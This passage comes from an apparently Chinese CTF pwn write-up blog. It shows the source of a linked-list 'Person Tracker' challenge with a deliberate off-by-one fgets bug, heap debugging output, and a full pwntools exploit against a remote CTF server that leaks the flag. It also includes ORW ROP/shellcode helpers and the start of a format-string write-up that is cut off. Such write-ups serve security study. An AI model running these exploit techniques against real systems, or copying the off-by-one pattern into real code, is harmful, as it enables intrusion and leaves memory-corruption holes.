class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> FLAGVAR</span><br><span class="hljs-comment">// In the server-side binary, `FLAGVAR` is set to the flag</span><br><span class="hljs-type">const</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> FLAG = FLAGVAR;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-type">const</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> FLAG = <span class="hljs-string">&quot;fakectf&#123;not the real flag&#125;&quot;</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> age;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">24</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span> *<span class="hljs-title">next</span>;</span><br>&#125; Person;<br><br>Person *root = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">uint64_t</span> person_count = <span class="hljs-number">0</span>;<br><br>Person *<span class="hljs-title function_">person_at_index</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span> &#123;<br>    Person *res = root;<br>    <span class="hljs-keyword">while</span> (idx &gt; <span class="hljs-number">0</span>) &#123;<br>        res = res-&gt;next;<br>        idx--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to the Person Tracker!&quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;MENU CHOICES:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Add a new person&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. View a person&#x27;s information&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. Update a person&#x27;s information&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter your choice: &quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-type">int</span> choice;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice) != <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid input. Please enter a number.\n&quot;</span>);<br>            <span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>); <br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        getchar();<br>        <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">1</span>) &#123;<br>            Person *new = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Person));<br>            new-&gt;next = root;<br>            root = new;<br>            person_count++;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter their age: &quot;</span>);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;new-&gt;age);<br>            getchar();<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter their name: &quot;</span>);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            fgets(new-&gt;name, <span class="hljs-keyword">sizeof</span>(new-&gt;name) + <span class="hljs-number">1</span>, <span class="hljs-built_in">stdin</span>); <span class="hljs-comment">// +1 for null byte</span><br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;New person prepended!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Specify the index of the person: &quot;</span>);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-type">int</span> idx;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);<br>            getchar();<br>            <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= person_count) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid index!&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            Person *p = person_at_index(idx);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What information do you want to view?&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Their age&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Their name&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter choice: &quot;</span>);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-type">int</span> choice2;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice2);<br>            getchar();<br>            <span class="hljs-keyword">if</span> (choice2 == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Their age is %lu\n&quot;</span>, p-&gt;age);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice2 == <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Their name is %s\n&quot;</span>, p-&gt;name);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Specify the index of the person: &quot;</span>);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-type">int</span> idx;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);<br>            getchar();<br>            <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= person_count) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid index!&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            Person *p = person_at_index(idx);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What information do you want to modify?&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Their age&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Their name&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter choice: &quot;</span>);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-type">int</span> choice2;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice2);<br>            getchar();<br>            <span class="hljs-keyword">if</span> (choice2 == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter their age: &quot;</span>);<br>                fflush(<span class="hljs-built_in">stdout</span>);<br>                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;p-&gt;age);<br>                getchar();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice2 == <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the new name: &quot;</span>);<br>                fflush(<span class="hljs-built_in">stdout</span>);<br>                fgets(p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name) + <span class="hljs-number">1</span>, <span class="hljs-built_in">stdin</span>); <span class="hljs-comment">// +1 for null byte</span><br>            &#125;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Updated successfully!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">000000000049B</span>21E aFakectfNotTheR db <span class="hljs-string">&#x27;fakectf&#123;not the real flag&#125;&#x27;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>根据源代码和逆向可知 flag 将会被加载到地址 0x49B21E 处。</p><p>很明显，代码中的注释表明我有 null by one 漏洞。</p><p>程序依靠 Person 结构体中的 struct Person *next 来索引下一个 Person 结构体，而新创建的结构体总是在头上。</p><p>通过调试我们发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x2e169c70</span><span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000031</span>.......<span class="hljs-number">.1</span>.......<br><span class="hljs-number">0x2e169c80</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x4141414141414141</span>........AAAAAAAA<br><span class="hljs-number">0x2e169c90</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000000000</span>................<br><span class="hljs-number">0x2e169ca0</span><span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000031</span>.......<span class="hljs-number">.1</span>.......<br><span class="hljs-number">0x2e169cb0</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x4141414141414141</span>........AAAAAAAA<br><span class="hljs-number">0x2e169cc0</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000000000</span>................<br><span class="hljs-number">0x2e169cd0</span><span class="hljs-number">0x000000002e169c80</span><span class="hljs-number">0x0000000000000031</span>.......<span class="hljs-number">.1</span>.......<br><span class="hljs-number">0x2e169ce0</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x4141414141414141</span>........AAAAAAAA<br><span class="hljs-number">0x2e169cf0</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000000000</span>................<br><span class="hljs-number">0x2e169d00</span><span class="hljs-number">0x000000002e169cb0</span><span class="hljs-number">0x0000000000000031</span>.......<span class="hljs-number">.1</span>.......<br><span class="hljs-number">0x2e169d10</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x4141414141414141</span>........AAAAAAAA<br><span class="hljs-number">0x2e169d20</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000000000</span>................<br><span class="hljs-number">0x2e169d30</span><span class="hljs-number">0x000000002e169ce0</span><span class="hljs-number">0x0000000000000031</span>.......<span class="hljs-number">.1</span>.......<br><span class="hljs-number">0x2e169d40</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x4141414141414141</span>........AAAAAAAA<br><span class="hljs-number">0x2e169d50</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000000000</span>................<br><span class="hljs-number">0x2e169d60</span><span class="hljs-number">0x000000002e169d10</span><span class="hljs-number">0x0000000000000031</span>.......<span class="hljs-number">.1</span>.......<br><span class="hljs-number">0x2e169d70</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x4141414141414141</span>........AAAAAAAA<br><span class="hljs-number">0x2e169d80</span><span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000000000</span>................<br><span class="hljs-number">0x2e169d90</span><span class="hljs-number">0x000000002e169d40</span><span class="hljs-number">0x000000000001f271</span>@.......q....... &lt;-- Top chunk<br>pwndbg&gt; <br></code></pre></td></tr></table></figure><p>我们可以发现地址 0x2e169d90 为 struct Person *next 指向的是 0x2e169d40，我们可以用 null by one 修改 0x2e169d90 地址处的 0x2e169d40 为 0x2e169d00 。</p><p>此时 0x2e169d00 + 0x20 处正好是 0x2e169d10 所在的 Person 结构体可编辑的位置，我们可以修改这里的地址为 0x49B21E - 0x8 的位置，从而通过 2 号 Person 结构体查看其 name 来将 flag 打印出来。</p><p>tips: 远程与本地所使用的 libc 略有不同，所以堆块的数量要做微调才能打通。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;: &quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br>p = remote(<span class="hljs-string">&quot;challs.watctf.org&quot;</span>, <span class="hljs-number">5151</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#loadsym = &quot;glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64&quot;</span><br><span class="hljs-comment">#code_addr = &quot; ./glibc-2.41.tar.gz --force&quot;</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">age, name</span>):<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(age))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index, choice</span>):<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(<span class="hljs-number">2</span>))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(index))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, choice, an</span>):<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(<span class="hljs-number">3</span>))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(index))<br>    sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(choice))<br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-number">1</span>:<br>        sela(<span class="hljs-string">b&quot;: &quot;</span>, stre(an))<br>    <span class="hljs-keyword">else</span>:<br>        sela(<span class="hljs-string">b&quot;: &quot;</span>, an)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    add(<span class="hljs-number">10</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span>)<br><br>add(<span class="hljs-number">10</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span> + p64(<span class="hljs-number">0x49B21E</span>-<span class="hljs-number">0x8</span>))<br>add(<span class="hljs-number">10</span>, <span class="hljs-string">b&quot;Z&quot;</span>*<span class="hljs-number">24</span>)<br><br>show(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br><br>op()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF4th_Pwn_WP</title>
    <link href="/2025/08/25/NSSCTF4th-Pwn-WP/"/>
    <url>/2025/08/25/NSSCTF4th-Pwn-WP/</url>
    
    <content type="html"><![CDATA[<hr><p>附件下载：<a href="https://z-l-s-f.lanzouq.com/icIXh34gwoxi">https://z-l-s-f.lanzouq.com/icIXh34gwoxi</a></p><hr><h3 id="how-to-fmt"><a href="#how-to-fmt" class="headerlink" title="how_to_fmt?"></a>how_to_fmt?</h3><p>check:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/zlsf/LS/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-90h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+98h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-built_in">printf</span>(a1);<br>  read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据 ida 显示，只有一次栈上的字符串格式化漏洞，没有后门也没有其他任何有用的函数或片段。</p><p>考虑到保护全开，我们应该使用 gdb 调试从栈上寻找机会。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">00:0000│ rsp     0x7ffd2d48c7f0 —▸ 0x7ffd2d48c820 ◂— 0<br>01:0008│-098     0x7ffd2d48c7f8 —▸ 0x6201a822a010 (<span class="hljs-built_in">log</span>) ◂— <span class="hljs-string">&#x27;welcome fmt!\n&#x27;</span><br>02:0010│ rdi rsi 0x7ffd2d48c800 ◂— <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span><br>03:0018│-088     0x7ffd2d48c808 ◂— 0<br>... ↓            14 skipped<br>12:0090│-010     0x7ffd2d48c880 —▸ 0x7ffd2d48c890 —▸ 0x7ffd2d48c8a0 —▸ 0x7ffd2d48c940 —▸ 0x7ffd2d48c9a0 ◂— ...<br>13:0098│-008     0x7ffd2d48c888 ◂— 0xe3de165ca93e4300<br>14:00a0│ rbp     0x7ffd2d48c890 —▸ 0x7ffd2d48c8a0 —▸ 0x7ffd2d48c940 —▸ 0x7ffd2d48c9a0 ◂— 0<br>15:00a8│+008     0x7ffd2d48c898 —▸ 0x6201a82272ea (main+33) ◂— mov eax, 0<br>16:00b0│+010     0x7ffd2d48c8a0 —▸ 0x7ffd2d48c940 —▸ 0x7ffd2d48c9a0 ◂— 0<br>17:00b8│+018     0x7ffd2d48c8a8 —▸ 0x78916b82a1ca (__libc_start_call_main+122) ◂— mov edi, eax<br>18:00c0│+020     0x7ffd2d48c8b0 —▸ 0x7ffd2d48c8f0 —▸ 0x6201a8229da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x6201a8227180 (__do_global_dtors_aux) ◂— endbr64 <br>19:00c8│+028     0x7ffd2d48c8b8 —▸ 0x7ffd2d48c9c8 —▸ 0x7ffd2d48e260 ◂— 0x5953006e77702f2e /* <span class="hljs-string">&#x27;./pwn&#x27;</span> */<br>1a:00d0│+030     0x7ffd2d48c8c0 ◂— 0x1a8226040<br>1b:00d8│+038     0x7ffd2d48c8c8 —▸ 0x6201a82272c9 (main) ◂— endbr64 <br>1c:00e0│+040     0x7ffd2d48c8d0 —▸ 0x7ffd2d48c9c8 —▸ 0x7ffd2d48e260 ◂— 0x5953006e77702f2e /* <span class="hljs-string">&#x27;./pwn&#x27;</span> */<br>1d:00e8│+048     0x7ffd2d48c8d8 ◂— 0x59446ddd09e915ac<br></code></pre></td></tr></table></figure><p>当断点下在 .text:00000000000012AD                 call    _printf 时我们不难发现栈上 0x7ffd2d48c880 和 0x7ffd2d48c890 都存在二级指向且 0x7ffd2d48c880 —▸ 0x7ffd2d48c890 —▸ 0x7ffd2d48c8a0 。</p><p>此时我们不难想到用一次字格通过 0x7ffd2d48c880 来修改 0x7ffd2d48c890 —▸ 